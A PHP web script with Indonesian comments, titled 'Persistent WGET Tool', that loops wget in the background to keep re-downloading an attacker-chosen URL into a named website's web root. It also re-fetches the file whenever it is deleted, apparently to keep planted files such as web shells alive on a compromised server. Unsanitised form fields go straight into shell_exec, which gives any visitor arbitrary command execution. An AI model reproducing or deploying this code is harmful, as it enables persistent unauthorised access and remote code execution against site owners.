<?php
session_start();

// Folder untuk menyimpan hasil unduhan
$downloadDir = __DIR__ . '/var/www/html/nexusmalls.com/';
if (!file_exists($downloadDir)) {
    mkdir($downloadDir, 0777, true);
}

// Fungsi untuk memulai unduhan
function startDownload($url, $filename, $interval) {
    global $downloadDir;
    $filePath = $downloadDir . '/' . $filename;

    // Mulai proses wget secara berulang setiap interval detik
    $cmd = "nohup bash -c 'while true; do wget -O \"$filePath\" \"$url\"; sleep $interval; done' > /dev/null 2>&1 & echo $!";
    $pid = shell_exec($cmd);

    $_SESSION['download_pid'] = trim($pid);
}

// Fungsi untuk menghentikan unduhan
function stopDownload() {
    if (isset($_SESSION['download_pid'])) {
        $pid = $_SESSION['download_pid'];
        shell_exec("kill $pid");
        unset($_SESSION['download_pid']);
    }
}

// Fungsi untuk memulihkan file yang dihapus
function recoverFile($filename) {
    global $downloadDir;
    $filePath = $downloadDir . '/' . $filename;

    // Jika file terhapus, lakukan unduhan ulang
    if (!file_exists($filePath)) {
        // Misalnya, kita set ulang unduhan dari URL tertentu
        $url = $_SESSION['download_url'] ?? '';
        if ($url) {
            shell_exec("wget -O \"$filePath\" \"$url\" > /dev/null 2>&1 &");
        }
    }
}

// Proses permintaan
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'];

    if ($action === 'start') {
        $url = $_POST['url'];
        $interval = isset($_POST['interval']) ? (int)$_POST['interval'] : 1;
        $filename = $_POST['filename'] ?? 'downloaded_file.ext';

        $_SESSION['download_url'] = $url;
        startDownload($url, $filename, $interval);
    } elseif ($action === 'stop') {
        stopDownload();
    } elseif ($action === 'recover') {
        $filename = $_POST['filename'] ?? 'downloaded_file.ext';
        recoverFile($filename);
    }
}

// Antarmuka HTML
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Persistent WGET Tool</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f8f9fa; padding: 20px; }
        .container { max-width: 400px; margin: auto; padding: 20px; background: #fff; box-shadow: 0px 0px 8px rgba(0, 0, 0, 0.1); border-radius: 8px; }
        label { display: block; margin-top: 10px; }
        input[type="text"], input[type="number"] { width: 100%; padding: 8px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px; }
        button { margin-top: 15px; padding: 10px; width: 100%; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        .status { margin-top: 15px; font-size: 0.9em; color: green; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Persistent WGET Tool</h2>
        <form method="post">
            <label for="url">File URL:</label>
            <input type="text" name="url" id="url" required placeholder="Enter file URL">
            
            <label for="interval">Interval (seconds):</label>
            <input type="number" name="interval" id="interval" value="1" min="1">
            
            <label for="filename">Filename:</label>
            <input type="text" name="filename" id="filename" value="downloaded_file.ext">

            <button type="submit" name="action" value="start">Start Download</button>
            <button type="submit" name="action" value="stop">Stop Download</button>
            <button type="submit" name="action" value="recover">Recover File</button>
        </form>

        <?php if (isset($_SESSION['download_pid'])): ?>
            <div class="status">Download in progress with PID: <strong><?php echo htmlspecialchars($_SESSION['download_pid']); ?></strong></div>
        <?php else: ?>
            <div class="status">No download in progress.</div>
        <?php endif; ?>
    </div>
</body>
</html>
